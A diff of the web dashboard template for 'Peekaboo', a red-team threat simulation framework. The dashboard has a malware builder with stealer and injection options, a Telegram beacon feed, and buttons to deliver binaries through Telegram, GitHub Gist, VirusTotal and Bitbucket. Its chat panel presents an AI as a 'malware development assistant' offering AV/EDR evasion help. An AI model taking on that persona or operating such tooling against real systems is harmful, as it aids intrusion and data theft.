-  .dot-dim { color:var(--dim); }
+  .spinner { display: inline-block; width: 12px; height: 12px; border: 2px solid var(--sep); border-top-color: var(--purple); border-radius: 50%; animation: spin .6s linear infinite; vertical-align: middle; margin-right: 6px; }
+  .sep-line { height: 1px; background: var(--sep); margin: 14px 0; }
+  .dot-ok  { color: var(--green); }
+  .dot-err { color: var(--red); }
+  .dot-dim { color: var(--dim); }
+  .text-purple { color: var(--purple); }
+  .text-green  { color: var(--green); }
+  .text-dim    { color: var(--dim); }
+  .text-blue   { color: var(--blue); }
+  .text-cyan   { color: var(--cyan); }
 
-  /* ── bottom bar ── */
-  .bottom-bar {
-    background:var(--bg2); border-top:1px solid var(--border);
-    padding:6px clamp(12px,3vw,28px);
-    font-size:clamp(10px,.95vw,calc(var(--fs)*.52));
-    color:var(--dim);
-    display:-webkit-box;display:-ms-flexbox;display:flex;
-    -ms-flex-wrap:wrap;flex-wrap:wrap;
-    gap:clamp(10px,2vw,22px);
-    -webkit-box-align:center;-ms-flex-align:center;align-items:center;
+  /* ── provider bar ── */
+  .provider-bar {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 12px;
+    flex-wrap: wrap;
   }
-  .bottom-bar span { color:var(--green); }
+  .provider-bar label { font-size: 12px; color: var(--dim); }
+
+  /* ── kb bar ── */
+  .kb-bar {
+    font-size: 12px;
+    color: var(--dim);
+    margin-bottom: 10px;
+    padding: 7px 12px;
+    background: var(--bg3);
+    border: 1px solid var(--sep);
+    border-radius: var(--radius-sm);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 6px;
+  }
+
+  /* ── config preview ── */
+  #config-preview {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--cyan);
+    margin-top: 10px;
+    white-space: pre-wrap;
+    word-break: break-all;
+    background: var(--bg);
+    border: 1px solid var(--sep);
+    border-radius: var(--radius-sm);
+    padding: 10px;
+    min-height: 40px;
+    display: none;
+  }
+  #config-preview.visible { display: block; }
+
+  /* ── page header ── */
+  .page-header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 22px;
+  }
+  .page-header h2 {
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--text);
+  }
+  .page-header .sub {
+    font-size: 13px;
+    color: var(--dim);
+  }
 
   /* ── responsive ── */
-  @media screen and (max-width: 1100px) {
-    .main-top  { -ms-grid-columns:1fr 1fr; grid-template-columns:1fr 1fr; grid-template-areas:"modules builder" "beacons beacons"; }
-    .panel-beacons { -ms-grid-column:1;-ms-grid-column-span:2; }
-    .panel     { max-height: none; }
+  @media (max-width: 900px) {
+    .page-grid-2, .page-grid-3 { grid-template-columns: 1fr; }
   }
-  @media screen and (max-width: 768px) {
-    .main-bottom { -ms-grid-columns:1fr; grid-template-columns:1fr; grid-template-areas:"c2demo" "chat"; }
-    .c2-channel-grid { -ms-grid-columns:1fr; grid-template-columns:1fr; }
-  }
-  @media screen and (max-width: 640px) {
-    :root { --fs: 20px; }
-    .main-top  { -ms-grid-columns:1fr; grid-template-columns:1fr; grid-template-areas:"builder" "modules" "beacons"; }
-    .form-row label { width:100%; text-align:left; }
-    header { -webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column; -webkit-box-align:start;-ms-flex-align:start;align-items:flex-start; }
-    .logo { font-size:13px; }
-    .bottom-bar { -webkit-box-pack:center;-ms-flex-pack:center;justify-content:center; }
-    #clock { -webkit-box-flex:0;-ms-flex:none;flex:none; margin-left:0 !important; width:100%; text-align:center; }
-  }
-  @media screen and (min-width: 1600px) {
-    .main-top { grid-template-columns: minmax(240px,20%) 1fr minmax(280px,24%); }
+  @media (max-width: 640px) {
+    :root { --sidebar-w: 64px; }
+    .nav-item span { display: none; }
+    .sidebar-brand .brand-name, .sidebar-brand .brand-sub, .sidebar-brand .cat,
+    .sidebar-section-label, .nav-badge, .sidebar-footer { display: none; }
+    .nav-item { justify-content: center; padding: 12px; }
+    .nav-item.active::before { display: none; }
+    .page { padding: 16px; }
   }
 </style>
 </head>
 <body>
 
-<header>
-  <pre class="logo">[=^..^=]
-[=^..^=] PEEKABOO
-[=^..^=] v0.2.0</pre>
-  <div class="header-meta">
-    <h1><span class="status-dot"></span>Peekaboo Dashboard</h1>
-    <div class="sub">Threat Simulation Framework &nbsp;|&nbsp; DEFCON Demo Labs Singapore 2026</div>
-    <div class="sub">by @cocomelonc &nbsp;&mdash;&nbsp; https://cocomelonc.github.io</div>
-  </div>
-</header>
+<div class="layout">
 
-<!-- ═══════════════════════ TOP ROW ═══════════════════════ -->
-<div class="main-top">
-
-  <!-- LEFT: Module Browser -->
-  <div class="panel panel-modules">
-    <div class="panel-title">Modules <span id="module-count"></span></div>
-    {% for group, items in modules.items() %}
-    <div class="module-group">
-      <div class="module-group-label">{{ group }} ({{ items|length }})</div>
-      {% for item in items %}<span class="module-tag">{{ item }}</span>
-      {% else %}<span class="text-dim" style="font-size:.6em">none</span>
-      {% endfor %}
-    </div>
-    {% endfor %}
-    <div class="sep"></div>
-    <div class="panel-title">Configs</div>
-    {% for cfg in ["telegram_config","github_config","bitbucket_config","virustotal_config"] %}
-    <div style="display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between;-webkit-box-align:center;-ms-flex-align:center;align-items:center;margin-bottom:7px;gap:6px;">
-      <span style="font-size:.6em;color:var(--dim)">{{ cfg.replace('_config','') }}</span>
-      <button class="btn" style="padding:2px 8px;font-size:.52em;" onclick="showConfig('{{ cfg }}')">view</button>
-    </div>
-    {% endfor %}
-    <pre id="config-preview" style="font-size:.5em;color:var(--blue);margin-top:8px;white-space:pre-wrap;word-break:break-all;"></pre>
-  </div>
-
-  <!-- CENTER: Builder + History -->
-  <div class="panel panel-builder">
-    <div class="tabs">
-      <div class="tab active" onclick="switchTab('builder',this)">Builder</div>
-      <div class="tab" onclick="switchTab('history',this)">History</div>
+  <!-- ═══════ SIDEBAR ═══════ -->
+  <nav class="sidebar">
+    <div class="sidebar-brand">
+      <pre class="cat">[=^..^=]
+PEEKABOO</pre>
+      <div class="brand-name">Peekaboo</div>
+      <div class="brand-sub">v0.2.0 · DEFCON Demo Labs</div>
     </div>
 
-    <div id="tab-builder" class="tab-content active">
-      <div class="form-row">
-        <label>payload</label>
-        <select id="f-payload">{% for p in modules.payloads %}<option value="{{ p }}"{% if p=='meow' %} selected{% endif %}>{{ p }}</option>{% endfor %}</select>
+    <div class="sidebar-section">
+      <div class="sidebar-section-label">Build</div>
+      <div class="nav-item active" onclick="showPage('builder',this)" data-page="builder">
+        <span class="nav-icon">🔨</span><span>Builder</span>
       </div>
-      <div class="form-row">
-        <label>encryption</label>
-        <select id="f-encryption">{% for c in modules.crypto %}<option value="{{ c }}"{% if c=='speck' %} selected{% endif %}>{{ c }}</option>{% endfor %}</select>
-      </div>
-      <div class="form-row">
-        <label>type</label>
-        <select id="f-malware"><option value="injection">injection</option><option value="stealer">stealer</option></select>
-      </div>
-      <div class="form-row">
-        <label>injection</label>
-        <select id="f-injection">{% for i in modules.injection %}<option value="{{ i }}"{% if i=='virtualallocex' %} selected{% endif %}>{{ i }}</option>{% endfor %}</select>
-      </div>
-      <div class="form-row">
-        <label>stealer</label>
-        <select id="f-stealer">{% for s in modules.stealer %}<option value="{{ s }}"{% if s=='telegram' %} selected{% endif %}>{{ s }}</option>{% endfor %}</select>
-      </div>
-      <div class="btn-row">
-        <button class="btn" id="btn-build" onclick="startBuild()">&#9658; Build</button>
-        <button class="btn btn-red" onclick="clearOutput()">&#10005; Clear</button>
-      </div>
-      <div id="build-status-bar" style="margin-top:8px;font-size:.6em;color:var(--dim);">
-        status: <span class="build-status idle">idle</span>
-        <span id="current-build-id" style="color:var(--dim);margin-left:8px;"></span>
-      </div>
-      <div id="build-output">// build output will appear here...</div>
-    </div>
-
-    <div id="tab-history" class="tab-content">
-      <div style="display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between;margin-bottom:10px;gap:8px;-ms-flex-wrap:wrap;flex-wrap:wrap;">
-        <span class="text-dim" style="font-size:.6em">recent builds (last 100)</span>
-        <button class="btn btn-blue" style="padding:3px 10px;font-size:.55em;" onclick="loadHistory()">refresh</button>
-      </div>
-      <div id="history-list"><span class="text-dim">loading...</span></div>
-    </div>
-  </div>
-
-  <!-- RIGHT: Beacon Feed -->
-  <div class="panel panel-beacons">
-    <div class="panel-title">Beacon Feed <span id="beacon-count"></span></div>
-    <div style="display:-webkit-box;display:-ms-flexbox;display:flex;gap:8px;margin-bottom:10px;-ms-flex-wrap:wrap;flex-wrap:wrap;-webkit-box-align:center;-ms-flex-align:center;align-items:center;">
-      <button class="btn" style="padding:3px 10px;font-size:.55em;" onclick="loadBeacons()">&#8635; Refresh</button>
-      <span id="beacon-auto" style="font-size:.5em;color:var(--dim)"></span>
-    </div>
-    <div id="beacon-list"><span class="beacon-empty">[ waiting for beacons... ]</span></div>
-  </div>
-
-</div>
-
-<!-- ═══════════════════════ BOTTOM ROW ═══════════════════════ -->
-<div class="main-bottom">
-
-  <!-- LEFT: C2 Binary Delivery Demo -->
-  <div class="panel panel-c2demo panel-bottom">
-    <div class="panel-title">
-      C2 Binary Delivery
-      <span class="badge badge-yellow">DEMO</span>
-      <span style="font-size:.5em;color:var(--dim);margin-left:8px;">T1102 · T1105</span>
-    </div>
-
-    <div id="binary-info">&#128032; checking for built binary...</div>
-
-    <div class="c2-channel-grid">
-
-      <div class="c2-card" id="card-telegram">
-        <div class="c2-name">&#128236; Telegram</div>
-        <div class="c2-status" id="status-telegram"><span class="dot-dim">&#9679;</span> checking...</div>
-        <button class="btn btn-purple" style="padding:4px 12px;font-size:.55em;width:100%;"
-          onclick="c2Drop('telegram')">Drop via Bot</button>
-        <div class="c2-technique">sendDocument API · bot exfil</div>
-      </div>
-
-      <div class="c2-card" id="card-github">
-        <div class="c2-name">&#128025; GitHub</div>
-        <div class="c2-status" id="status-github"><span class="dot-dim">&#9679;</span> checking...</div>
-        <button class="btn btn-blue" style="padding:4px 12px;font-size:.55em;width:100%;"
-          onclick="c2Drop('github')">Drop to Gist</button>
-        <div class="c2-technique">Gist dead-drop · T1102.001</div>
-      </div>
-
-      <div class="c2-card" id="card-virustotal">
-        <div class="c2-name">&#128202; VirusTotal</div>
-        <div class="c2-status" id="status-virustotal"><span class="dot-dim">&#9679;</span> checking...</div>
-        <button class="btn btn-orange" style="padding:4px 12px;font-size:.55em;width:100%;"
-          onclick="c2Drop('virustotal')">Upload + Scan</button>
-        <div class="c2-technique">VT abuse · detection score</div>
-      </div>
-
-      <div class="c2-card" id="card-bitbucket">
-        <div class="c2-name">&#128736; Bitbucket</div>
-        <div class="c2-status" id="status-bitbucket"><span class="dot-dim">&#9679;</span> checking...</div>
-        <button class="btn" style="padding:4px 12px;font-size:.55em;width:100%;"
-          onclick="c2Drop('bitbucket')">Push to Repo</button>
-        <div class="c2-technique">repo staging · T1102</div>
-      </div>
-
-    </div>
-
-    <div id="c2-result-area"></div>
-  </div>
-
-  <!-- RIGHT: AI Chatbot -->
-  <div class="panel panel-chat panel-bottom">
-    <div class="panel-title">
-      Peekaboo AI
-      <span class="badge {% if kb and kb.status == 'ready' %}badge-green{% else %}badge-dim{% endif %}" id="kb-badge">
-        {% if kb and kb.status == 'ready' %}KB: {{ kb.posts }} posts{% else %}KB: not scraped{% endif %}
-      </span>
-    </div>
-
-    <div class="kb-bar">
-      <span id="kb-info-text">
-        {% if kb and kb.status == 'ready' %}
-          &#128218; {{ kb.posts }} blog posts indexed &nbsp;|&nbsp; {{ kb.blog }}
-        {% else %}
-          &#9888; knowledge base not built yet
-        {% endif %}
-      </span>
-      <button class="btn btn-blue" style="padding:2px 8px;font-size:.5em;" onclick="triggerScrape()">
-        &#8635; Scrape Blog
-      </button>
-    </div>
-
-    <div style="display:-webkit-box;display:-ms-flexbox;display:flex;gap:8px;margin-bottom:10px;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-ms-flex-wrap:wrap;flex-wrap:wrap;">
-      <span style="font-size:.55em;color:var(--dim);">model:</span>
-      <select id="provider-select" onchange="onProviderChange()" style="font-size:.55em;padding:4px 8px;-webkit-box-flex:0;-ms-flex:none;flex:none;width:auto;">
-        <option value="claude">&#128032; Claude (Opus 4.6)</option>
-        <option value="gemini">&#9993; Gemini</option>
-      </select>
-      <span id="provider-status" style="font-size:.5em;color:var(--dim);"></span>
-    </div>
-
-    <div class="chat-messages" id="chat-messages">
-      <div class="msg msg-assistant">
-        <div class="msg-label">&#128032; PEEKABOO AI</div>
-        <div>Hello! I'm your C2 & malware development assistant, powered by Claude and grounded in @cocomelonc's research.<br><br>Ask me anything about:<br>• C2 channels (GitHub, Telegram, Bitbucket, VirusTotal)<br>• Binary delivery &amp; payload dropping<br>• Process injection techniques<br>• AV/EDR bypass &amp; evasion<br>• Detection &amp; MITRE ATT&amp;CK mapping</div>
+      <div class="nav-item" onclick="showPage('history',this)" data-page="history">
+        <span class="nav-icon">🕐</span><span>History</span>
       </div>
     </div>
 
-    <div class="chat-input-row">
-      <textarea id="chat-input" placeholder="Ask about C2 channels, binary delivery, injection techniques..."
-        onkeydown="chatKeydown(event)"></textarea>
-      <button class="btn btn-purple" id="btn-chat-send" onclick="sendChat()" style="padding:10px 16px;font-size:.6em;height:52px;">
-        &#9658; Send
-      </button>
+    <div class="sidebar-section">
+      <div class="sidebar-section-label">C2</div>
+      <div class="nav-item" onclick="showPage('beacons',this)" data-page="beacons">
+        <span class="nav-icon">📡</span><span>Beacons</span>
+        <span class="nav-badge live" id="nav-beacon-count"></span>
+      </div>
+      <div class="nav-item" onclick="showPage('delivery',this)" data-page="delivery">
+        <span class="nav-icon">🚀</span><span>Delivery</span>
+        <span class="nav-badge badge-yellow">DEMO</span>
+      </div>
     </div>
 
-    <div style="margin-top:6px;display:-webkit-box;display:-ms-flexbox;display:flex;gap:8px;-ms-flex-wrap:wrap;flex-wrap:wrap;">
-      <button class="btn" style="padding:3px 10px;font-size:.5em;" onclick="quickAsk('How does GitHub C2 dead-drop work?')">GitHub C2</button>
-      <button class="btn" style="padding:3px 10px;font-size:.5em;" onclick="quickAsk('Explain Telegram bot C2 and binary delivery')">Telegram drop</button>
-      <button class="btn" style="padding:3px 10px;font-size:.5em;" onclick="quickAsk('How does VirtualAllocEx injection work?')">Injection</button>
-      <button class="btn" style="padding:3px 10px;font-size:.5em;" onclick="quickAsk('What MITRE ATT&CK techniques does this framework cover?')">ATT&CK map</button>
-      <button class="btn btn-red" style="padding:3px 10px;font-size:.5em;" onclick="clearChat()">&#10005; Clear</button>
+    <div class="sidebar-section">
+      <div class="sidebar-section-label">Tools</div>
+      <div class="nav-item" onclick="showPage('chat',this)" data-page="chat">
+        <span class="nav-icon">🤖</span><span>AI Chat</span>
+      </div>
+      <div class="nav-item" onclick="showPage('modules',this)" data-page="modules">
+        <span class="nav-icon">📦</span><span>Modules</span>
+      </div>
     </div>
-  </div>
 
-</div>
+    <div class="sidebar-footer">
+      <span class="status-dot"></span> online &nbsp;·&nbsp; @cocomelonc
+    </div>
+  </nav>
 
-<div class="bottom-bar">
-  <div>peekaboo &nbsp;<span>v0.2.0</span></div>
-  <div>DEFCON Demo Labs &nbsp;<span>Singapore 2026</span></div>
-  <div>@cocomelonc</div>
-  <div id="clock" style="margin-left:auto;"></div>
-</div>
+  <!-- ═══════ MAIN ═══════ -->
+  <div class="main">
+
+    <!-- topbar -->
+    <div class="topbar">
+      <span class="topbar-title" id="topbar-title">Builder</span>
+      <span class="topbar-sub" id="topbar-sub">Threat Simulation Framework · DEFCON Demo Labs Singapore 2026</span>
+      <span id="clock"></span>
+    </div>
+
+    <!-- ══ PAGE: Builder ══ -->
+    <div class="page active" id="page-builder">
+      <div class="page-header">
+        <h2>Builder</h2>
+        <span class="badge badge-purple">payload forge</span>
+      </div>
+
+      <div class="page-grid-2">
+        <div class="card">
+          <div class="card-title"><span class="icon">⚙️</span> Build Parameters</div>
+
+          <div class="form-row">
+            <label>payload</label>
+            <select id="f-payload">{% for p in modules.payloads %}<option value="{{ p }}"{% if p=='meow' %} selected{% endif %}>{{ p }}</option>{% endfor %}</select>
+          </div>
+          <div class="form-row">
+            <label>encryption</label>
+            <select id="f-encryption">{% for c in modules.crypto %}<option value="{{ c }}"{% if c=='speck' %} selected{% endif %}>{{ c }}</option>{% endfor %}</select>
+          </div>
+          <div class="form-row">
+            <label>type</label>
+            <select id="f-malware"><option value="injection">injection</option><option value="stealer">stealer</option></select>
+          </div>
+          <div class="form-row">
+            <label>injection</label>
+            <select id="f-injection">{% for i in modules.injection %}<option value="{{ i }}"{% if i=='virtualallocex' %} selected{% endif %}>{{ i }}</option>{% endfor %}</select>
+          </div>
+          <div class="form-row">
+            <label>stealer</label>
+            <select id="f-stealer">{% for s in modules.stealer %}<option value="{{ s }}"{% if s=='telegram' %} selected{% endif %}>{{ s }}</option>{% endfor %}</select>
+          </div>
+
+          <div class="btn-row">
+            <button class="btn btn-primary" id="btn-build" onclick="startBuild()">▶ Build</button>
+            <button class="btn btn-red" onclick="clearOutput()">✕ Clear</button>
+          </div>
+
+          <div style="margin-top:12px;font-size:12px;color:var(--dim);">
+            status: <span class="build-status idle" id="build-status-badge">idle</span>
+            <span id="current-build-id" style="color:var(--dim);margin-left:8px;font-family:var(--mono);font-size:11px;"></span>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-title"><span class="icon">🖥️</span> Build Output</div>
+          <div id="build-output">// build output will appear here...</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══ PAGE: History ══ -->
+    <div class="page" id="page-history">
+      <div class="page-header">
+        <h2>Build History</h2>
+        <span class="badge badge-dim">last 100</span>
+      </div>
+      <div class="card">
+        <div class="card-title" style="justify-content:space-between;">
+          <span><span class="icon">🕐</span> Recent Builds</span>
+          <button class="btn btn-blue" style="font-size:12px;padding:5px 12px;" onclick="loadHistory()">↻ Refresh</button>
+        </div>
+        <div id="history-list"><span class="text-dim">loading...</span></div>
+      </div>
+    </div>
+
+    <!-- ══ PAGE: Beacons ══ -->
+    <div class="page" id="page-beacons">
+      <div class="page-header">
+        <h2>Beacon Feed</h2>
+        <span class="badge badge-green" id="beacon-count-badge"></span>
+      </div>
+      <div class="card">
+        <div class="card-title" style="justify-content:space-between;">
+          <span><span class="icon">📡</span> Telegram Beacons</span>
+          <div style="display:flex;gap:8px;align-items:center;">
+            <span style="font-size:11px;color:var(--dim);" id="beacon-auto"></span>
+            <button class="btn btn-green" style="font-size:12px;padding:5px 12px;" onclick="loadBeacons()">↻ Refresh</button>
+          </div>
+        </div>
+        <div id="beacon-list"><span class="beacon-empty">[ waiting for beacons... ]</span></div>
+      </div>
+    </div>
+
+    <!-- ══ PAGE: Delivery ══ -->
+    <div class="page" id="page-delivery">
+      <div class="page-header">
+        <h2>C2 Binary Delivery</h2>
+        <span class="badge badge-yellow">DEMO</span>
+        <span style="font-size:12px;color:var(--dim);margin-left:4px;">T1102 · T1105</span>
+      </div>
+
+      <div id="binary-info">🐱 checking for built binary...</div>
+
+      <div class="page-grid-2">
+
+        <div class="c2-card" id="card-telegram">
+          <div class="c2-name">📨 Telegram</div>
+          <div class="c2-status" id="status-telegram"><span class="dot-dim">●</span> checking...</div>
+          <button class="btn btn-primary" style="width:100%;" onclick="c2Drop('telegram')">Drop via Bot</button>
+          <div class="c2-technique">sendDocument API · bot exfil</div>
+        </div>
+
+        <div class="c2-card" id="card-github">
+          <div class="c2-name">🐙 GitHub</div>
+          <div class="c2-status" id="status-github"><span class="dot-dim">●</span> checking...</div>
+          <button class="btn btn-blue" style="width:100%;" onclick="c2Drop('github')">Drop to Gist</button>
+          <div class="c2-technique">Gist dead-drop · T1102.001</div>
+        </div>
+
+        <div class="c2-card" id="card-virustotal">
+          <div class="c2-name">📊 VirusTotal</div>
+          <div class="c2-status" id="status-virustotal"><span class="dot-dim">●</span> checking...</div>
+          <button class="btn btn-orange" style="width:100%;" onclick="c2Drop('virustotal')">Upload + Scan</button>
+          <div class="c2-technique">VT abuse · detection score</div>
+        </div>
+
+        <div class="c2-card" id="card-bitbucket">
+          <div class="c2-name">🔧 Bitbucket</div>
+          <div class="c2-status" id="status-bitbucket"><span class="dot-dim">●</span> checking...</div>
+          <button class="btn btn-cyan" style="width:100%;" onclick="c2Drop('bitbucket')">Push to Repo</button>
+          <div class="c2-technique">repo staging · T1102</div>
+        </div>
+
+      </div>
+
+      <div id="c2-result-area"></div>
+    </div>
+
+    <!-- ══ PAGE: AI Chat ══ -->
+    <div class="page" id="page-chat">
+      <div class="page-header">
+        <h2>Peekaboo AI</h2>
+        <span class="badge {% if kb and kb.status == 'ready' %}badge-green{% else %}badge-dim{% endif %}" id="kb-badge">
+          {% if kb and kb.status == 'ready' %}KB: {{ kb.posts }} posts{% else %}KB: not scraped{% endif %}
+        </span>
+      </div>
+
+      <div class="kb-bar">
+        <span id="kb-info-text">
+          {% if kb and kb.status == 'ready' %}
+            📚 {{ kb.posts }} blog posts indexed &nbsp;|&nbsp; {{ kb.blog }}
+          {% else %}
+            ⚠️ knowledge base not built yet
+          {% endif %}
+        </span>
+        <button class="btn btn-blue" style="font-size:12px;padding:5px 12px;" onclick="triggerScrape()">↻ Scrape Blog</button>
+      </div>
+
+      <div class="provider-bar">
+        <label>Model:</label>
+        <select id="provider-select" onchange="onProviderChange()" style="flex:none;width:auto;font-size:13px;padding:6px 10px;">
+          <option value="claude">🐱 Claude (Opus 4.6)</option>
+          <option value="gemini">✉️ Gemini</option>
+        </select>
+        <span id="provider-status" style="font-size:12px;color:var(--dim);"></span>
+      </div>
+
+      <div class="card" style="padding:0;overflow:hidden;">
+        <div class="chat-messages" id="chat-messages">
+          <div class="msg msg-assistant">
+            <div class="msg-label">🐱 PEEKABOO AI</div>
+            <div>Hello! I'm your C2 &amp; malware development assistant, powered by Claude and grounded in @cocomelonc's research.<br><br>Ask me anything about:<br>• C2 channels (GitHub, Telegram, Bitbucket, VirusTotal)<br>• Binary delivery &amp; payload dropping<br>• Process injection techniques<br>• AV/EDR bypass &amp; evasion<br>• Detection &amp; MITRE ATT&amp;CK mapping</div>
+          </div>
+        </div>
+        <div style="padding:14px 14px 10px;">
+          <div class="chat-input-row">
+            <textarea id="chat-input" placeholder="Ask about C2 channels, binary delivery, injection techniques..." onkeydown="chatKeydown(event)"></textarea>
+            <button class="btn btn-primary" id="btn-chat-send" onclick="sendChat()" style="padding:12px 18px;height:54px;">▶ Send</button>
+          </div>
+          <div class="quick-btns">
+            <span class="quick-btn" onclick="quickAsk('How does GitHub C2 dead-drop work?')">GitHub C2</span>
+            <span class="quick-btn" onclick="quickAsk('Explain Telegram bot C2 and binary delivery')">Telegram drop</span>
+            <span class="quick-btn" onclick="quickAsk('How does VirtualAllocEx injection work?')">Injection</span>
+            <span class="quick-btn" onclick="quickAsk('What MITRE ATT&CK techniques does this framework cover?')">ATT&CK map</span>
+            <span class="quick-btn" style="color:var(--red);border-color:var(--red);" onclick="clearChat()">✕ Clear</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══ PAGE: Modules ══ -->
+    <div class="page" id="page-modules">
+      <div class="page-header">
+        <h2>Modules</h2>
+        <span class="badge badge-blue" id="module-count-badge"></span>
+      </div>
+
+      <div class="page-grid-2">
+        <div class="card">
+          <div class="card-title"><span class="icon">📦</span> Available Modules</div>
+          {% for group, items in modules.items() %}
+          <div class="module-group">
+            <div class="module-group-label">{{ group }} ({{ items|length }})</div>
+            {% for item in items %}<span class="module-tag">{{ item }}</span>
+            {% else %}<span class="text-dim" style="font-size:12px;">none</span>
+            {% endfor %}
+          </div>
+          {% endfor %}
+        </div>
+
+        <div class="card">
+          <div class="card-title"><span class="icon">🔑</span> Configs</div>
+          {% for cfg in ["telegram_config","github_config","bitbucket_config","virustotal_config"] %}
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;gap:8px;">
+            <span style="font-size:13px;color:var(--text2);">{{ cfg.replace('_config','') }}</span>
+            <button class="btn btn-blue" style="padding:4px 12px;font-size:12px;" onclick="showConfig('{{ cfg }}')">view</button>
+          </div>
+          {% endfor %}
+          <pre id="config-preview"></pre>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /.main -->
+</div><!-- /.layout -->
 
 <script>
 'use strict';
+
+// ── page navigation ────────────────────────────────────────────────────────────
+var _pageTitles = {
+  builder:  'Builder',
+  history:  'Build History',
+  beacons:  'Beacon Feed',
+  delivery: 'C2 Binary Delivery',
+  chat:     'AI Chat',
+  modules:  'Modules',
+};
+
+function showPage(name, navEl) {
+  document.querySelectorAll('.page').forEach(function(p){ p.classList.remove('active'); });
+  document.querySelectorAll('.nav-item').forEach(function(n){ n.classList.remove('active'); });
+  var pg = document.getElementById('page-' + name);
+  if (pg) pg.classList.add('active');
+  if (navEl) navEl.classList.add('active');
+  document.getElementById('topbar-title').textContent = _pageTitles[name] || name;
+  // on-navigate actions
+  if (name === 'history')  loadHistory();
+  if (name === 'beacons')  loadBeacons();
+  if (name === 'delivery') { loadBinaryInfo(); loadC2Status(); }
+}
 
 // ── utils ──────────────────────────────────────────────────────────────────────
 function escapeHtml(s) {
@@ -595,15 +935,6 @@ function colorize(txt) {
   return txt;
 }
 
-// ── tabs ───────────────────────────────────────────────────────────────────────
-function switchTab(name, el) {
-  document.querySelectorAll('.tab').forEach(function(t){t.classList.remove('active');});
-  document.querySelectorAll('.tab-content').forEach(function(t){t.classList.remove('active');});
-  el.classList.add('active');
-  document.getElementById('tab-'+name).classList.add('active');
-  if (name === 'history') loadHistory();
-}
-
 // ── builder ────────────────────────────────────────────────────────────────────
 var _pollInterval = null;
 var _currentBuildId = null;
@@ -617,66 +948,69 @@ function startBuild() {
     stealer:    document.getElementById('f-stealer').value,
   };
   document.getElementById('btn-build').disabled = true;
-  setStatusBar('queued');
+  setStatusBadge('queued');
   setOutput('// queuing build...\n// params: ' + JSON.stringify(params, null, 2));
 
   fetch('/api/build', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(params)})
-  .then(function(r){return r.json();})
-  .then(function(d){
+  .then(function(r){ return r.json(); })
+  .then(function(d) {
     _currentBuildId = d.build_id;
     document.getElementById('current-build-id').textContent = '#' + _currentBuildId;
     appendOutput('\n// build id: ' + _currentBuildId + '\n// compiling...');
-    _pollInterval = setInterval(function(){pollBuild(_currentBuildId);}, 1200);
+    _pollInterval = setInterval(function(){ pollBuild(_currentBuildId); }, 1200);
   })
-  .catch(function(e){
+  .catch(function(e) {
     appendOutput('\n// error: ' + e);
-    setStatusBar('error');
+    setStatusBadge('error');
     document.getElementById('btn-build').disabled = false;
   });
 }
 
 function pollBuild(id) {
-  fetch('/api/build/'+id)
-  .then(function(r){return r.json();})
-  .then(function(d){
-    setStatusBar(d.status);
+  fetch('/api/build/' + id)
+  .then(function(r){ return r.json(); })
+  .then(function(d) {
+    setStatusBadge(d.status);
     if (d.output) renderOutput(d.output);
     if (d.status !== 'running' && d.status !== 'queued') {
       clearInterval(_pollInterval); _pollInterval = null;
       document.getElementById('btn-build').disabled = false;
-      // refresh binary info after build
-      if (d.status === 'success') { setTimeout(loadBinaryInfo, 1000); }
+      if (d.status === 'success') setTimeout(loadBinaryInfo, 1000);
     }
   });
 }
 
-function setStatusBar(status) {
-  var el = document.querySelector('#build-status-bar .build-status');
+function setStatusBadge(status) {
+  var el = document.getElementById('build-status-badge');
   el.className = 'build-status ' + status;
   el.textContent = status;
 }
 function setOutput(txt)    { document.getElementById('build-output').innerHTML = colorize(txt); }
-function appendOutput(txt) { var el=document.getElementById('build-output'); el.innerHTML+=colorize(txt); el.scrollTop=el.scrollHeight; }
-function renderOutput(raw) { var el=document.getElementById('build-output'); el.innerHTML=colorize(raw); el.scrollTop=el.scrollHeight; }
-function clearOutput()     { document.getElementById('build-output').innerHTML='// cleared.'; document.getElementById('current-build-id').textContent=''; setStatusBar('idle'); }
+function appendOutput(txt) { var el = document.getElementById('build-output'); el.innerHTML += colorize(txt); el.scrollTop = el.scrollHeight; }
+function renderOutput(raw) { var el = document.getElementById('build-output'); el.innerHTML = colorize(raw); el.scrollTop = el.scrollHeight; }
+function clearOutput()     { document.getElementById('build-output').innerHTML = '// cleared.'; document.getElementById('current-build-id').textContent = ''; setStatusBadge('idle'); }
 
-// ── beacon feed ────────────────────────────────────────────────────────────────
+// ── beacons ────────────────────────────────────────────────────────────────────
 function loadBeacons() {
-  document.getElementById('beacon-list').innerHTML='<span class="beacon-empty"><span class="spinner"></span>fetching...</span>';
+  document.getElementById('beacon-list').innerHTML = '<span class="beacon-empty"><span class="spinner"></span>fetching...</span>';
   fetch('/api/beacons')
-  .then(function(r){return r.json();})
-  .then(function(d){
-    var list=document.getElementById('beacon-list');
-    if (d.error) { list.innerHTML='<span class="beacon-empty" style="color:var(--yellow)">[!] '+escapeHtml(d.error)+'</span>'; return; }
-    document.getElementById('beacon-count').textContent='('+d.messages.length+')';
-    if (!d.messages.length) { list.innerHTML='<span class="beacon-empty">[ no messages yet ]</span>'; return; }
-    list.innerHTML = d.messages.map(function(m){
-      return '<div class="beacon-item"><span class="b-from">&#128032; '+escapeHtml(String(m.from))+'</span>'
-        +'<span class="b-time">'+new Date(m.date*1000).toLocaleTimeString()+'</span>'
-        +'<div class="b-text">'+escapeHtml(m.text)+'</div></div>';
+  .then(function(r){ return r.json(); })
+  .then(function(d) {
+    var list = document.getElementById('beacon-list');
+    if (d.error) { list.innerHTML = '<span class="beacon-empty" style="color:var(--yellow)">[!] ' + escapeHtml(d.error) + '</span>'; return; }
